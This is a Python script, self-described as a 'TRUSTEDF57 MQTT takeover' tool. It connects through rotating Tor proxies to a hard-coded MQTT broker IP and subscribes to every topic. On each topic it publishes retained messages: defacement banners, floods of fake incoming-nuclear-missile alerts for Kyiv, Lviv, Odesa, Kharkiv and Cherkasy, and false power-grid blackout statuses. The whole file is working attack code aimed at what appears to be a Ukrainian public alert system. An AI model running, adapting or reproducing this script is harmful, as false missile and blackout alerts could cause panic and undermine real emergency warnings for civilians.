#!/usr/bin/env python3
"""
TRUSTEDF57 - MQTTALERT FIXED API 1.0 DEPRECATED
212.26.132.229:1883 - NO DEPRECATED WARNINGS
"""

import paho.mqtt.client as mqtt
import json
import time
import subprocess
import threading
import random
import sys
import os
import socket
from queue import Queue
import signal

BROKER = "212.26.132.229"
PORT = 1883

NUCLEAR_PAYLOADS = [
    {"lat":50.4501, "lon":30.5234, "city":"KYIV", "type":"ICBM", "eta":120},
    {"lat":49.8397, "lon":24.0297, "city":"LVIV", "type":"CRUISE", "eta":180},
    {"lat":46.4825, "lon":30.7233, "city":"ODESA", "type":"KINSHAL", "eta":90},
    {"lat":49.9935, "lon":36.2304, "city":"KHARKIV", "type":"ISLANDER", "eta":150},
    {"lat":48.5164, "lon":31.1780, "city":"CHERKASY", "type":"TACTICAL", "eta":200}
] * 200

class PerfectTakeover:
    def __init__(self):
        self.defaced = set()
        self.queue = Queue()
        self.proxy_idx = 0
        self.hits = 0
        self.missiles = 0
        self.running = True
        self.cmd_count = 0
        self.tor_ports = [9050, 9150, 1080, 1081, 1082, 1083]
    
    def tor_instances(self):
        for p in self.tor_ports:
            subprocess.run(["pkill", "-f", f"SocksPort {p}"], timeout=3)
            tor_dir = f"/tmp/tor{p}"
            os.makedirs(tor_dir, exist_ok=True)
            
            tor = subprocess.Popen([
                "tor", f"--SocksPort {p}", f"--DataDirectory {tor_dir}",
                f"--Log notice file:{tor_dir}/tor.log"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"TOR {p} → PID {tor.pid}")
            time.sleep(2)
    
    def tor_socket_client(self):
        """FIX API 1.0 DEPRECATED - NEW CLIENT V2"""
        port = self.tor_ports[self.proxy_idx % len(self.tor_ports)]
        self.proxy_idx += 1
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect(("127.0.0.1", port))
        
        # FIX: Client(protocol=mqtt.MQTTv5) + callback_error
        client = mqtt.Client(protocol=mqtt.MQTTv311, callback_api_version=mqtt.CallbackAPIVersion.VERSION1)
        client.sock = sock
        
        def on_connect(client, userdata, flags, rc):
            if rc == 0:
                client.subscribe("#", qos=2)
        
        client.on_connect = on_connect
        client.connect(BROKER, PORT, 10)
        return client
    
    def deface_alert(self, topic, client):
        msg = json.dumps({
            "title": "🚨 TRUSTEDF57 GOVERNA UKRAINE 🚨",
            "message": "SISTEMA ALLARME HACKATO - CONTROLLO TOTALE",
            "hacked": True, "author": "TRUSTEDF57",
            "priority": 999, "sound": "siren_max",
            "vibrate": True, "popup": True
        })
        result = client.publish(topic, msg, qos=2, retain=True)
        return result.rc == mqtt.MQTT_ERR_SUCCESS
    
    def nuclear_flood(self, topic, client):
        base = topic.replace("/AIR/", "/NUCLEAR/").replace("/CUSTOM/", "/NUCLEAR/")
        count = 0
        for m in NUCLEAR_PAYLOADS[:20]:  # Ridotto per speed
            try:
                region = topic.split("/")[1] if "/" in topic else "UA"
                missile = json.dumps({
                    "event": "nuclear_incoming", "region": region,
                    "lat": m["lat"], "lon": m["lon"], "city": m["city"],
                    "missile_type": m["type"], "eta": m["eta"],
                    "hacked": True, "source": "TRUSTEDF57"
                })
                result = client.publish(base, missile, qos=2, retain=True)
                if result.rc == mqtt.MQTT_ERR_SUCCESS:
                    count += 1
            except:
                pass
        self.missiles += count
        return count
    
    def kyiv_blackout(self, topic, client):
        if any(x in topic.lower() for x in ["power", "yasno", "grid"]):
            blackout = json.dumps({
                "status": "OFFLINE_HACKED", "voltage": 0, "power": 0,
                "groups": "ALL_DOWN", "hacked": "TRUSTEDF57"
            })
            client.publish(topic, blackout, qos=2, retain=True)
    
    def process_topic(self, topic):
        if topic in self.defaced or len(topic) > 200:
            return
        client = None
        try:
            client = self.tor_socket_client()
            client.loop_start()
            time.sleep(1)
            
            self.deface_alert(topic, client)
            missiles_sent = self.nuclear_flood(topic, client)
            self.kyiv_blackout(topic, client)
            
            time.sleep(1)
            self.defaced.add(topic)
            self.hits += 1
            print(f"✅ HIT: {topic[:40]}... | Missili: +{missiles_sent:,} | Total: {self.hits:,}")
            
        except Exception as e:
            pass
        finally:
            if client:
                try:
                    client.loop_stop()
                    client.disconnect()
                    client.sock.close()
                except:
                    pass
    
    def discovery(self):
        while self.running:
            client = None
            try:
                client = self.tor_socket_client()
                def on_msg(client, userdata, msg):
                    if msg.topic not in self.defaced:
                        self.queue.put(msg.topic)
                
                client.on_message = on_msg
                client.loop_start()
                print("🔍 DISCOVERY ACTIVE...")
                
                # Run 60s poi rotate
                time.sleep(60)
                
            except:
                pass
            finally:
                if client:
                    try:
                        client.loop_stop()
                        client.disconnect()
                    except:
                        pass
            time.sleep(5)
    
    def workers(self):
        while self.running:
            try:
                topic = self.queue.get(timeout=3)
                t = threading.Thread(target=self.process_topic, args=(topic,), daemon=True)
                t.start()
                time.sleep(0.1)  # Throttle
            except:
                pass
    
    def run(self):
        print("🚀 TRUSTEDF57 MQTT TAKEOVER v2.0 - NO DEPRECATED")
        self.tor_instances()
        
        threading.Thread(target=self.discovery, daemon=True).start()
        
        for _ in range(80):  # Ridotto per stability
            threading.Thread(target=self.workers, daemon=True).start()
        
        try:
            while self.running:
                print(f"🔥 LIVE | Defaced: {len(self.defaced):,} | Missili: {self.missiles:,} | Hits: {self.hits:,}")
                time.sleep(20)
        except KeyboardInterrupt:
            self.running = False

if __name__ == "__main__":
    takeover = PerfectTakeover()
    signal.signal(signal.SIGINT, lambda x,y: globals().update(running=False))
    takeover.run()
